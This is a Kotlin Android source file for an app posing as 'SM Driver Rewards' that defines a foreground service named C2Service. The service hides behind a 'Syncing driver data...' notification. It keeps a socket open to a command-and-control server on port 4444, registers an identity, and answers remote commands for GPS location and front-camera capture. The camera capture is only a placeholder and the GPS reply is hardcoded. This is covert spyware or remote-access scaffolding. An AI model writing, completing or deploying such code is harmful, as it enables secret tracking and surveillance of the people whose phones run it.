package com.sm.driverrewards

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.IBinder
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.Socket

class C2Service : Service() {
    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private val serverIp = "192.168.1.100" // Replace with actual C2 server IP
    private val serverPort = 4444

    override fun onCreate() {
        super.onCreate()
        startForeground(1, createNotification())
        startSocketClient()
    }

    private fun createNotification(): Notification {
        val channelId = "c2_channel"
        val channel = NotificationChannel(
            channelId,
            "Background Sync",
            NotificationManager.IMPORTANCE_LOW
        )
        val manager = getSystemService(NotificationManager::class.java)
        manager?.createNotificationChannel(channel)

        return Notification.Builder(this, channelId)
            .setContentTitle("SM Driver Rewards")
            .setContentText("Syncing driver data...")
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .build()
    }

    private fun startSocketClient() {
        serviceScope.launch {
            while (isActive) {
                try {
                    val socket = Socket(serverIp, serverPort)
                    val writer = PrintWriter(socket.getOutputStream(), true)
                    val reader = BufferedReader(InputStreamReader(socket.getInputStream()))

                    // Send identity registration handshake
                    writer.println("REG:Vicky")

                    var line: String?
                    while (isActive && reader.readLine().also { line = it } != null) {
                        handleCommand(line, writer)
                    }
                } catch (e: Exception) {
                    delay(10000) // Reconnect interval on failure
                }
            }
        }
    }

    private fun handleCommand(cmd: String?, writer: PrintWriter) {
        when (cmd) {
            "CMD_GPS" -> {
                writer.println("GPS:37.7749,-122.4194")
            }
            "CMD_SNAP_FRONT" -> {
                // Camera frame capture logic placeholder
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }
}
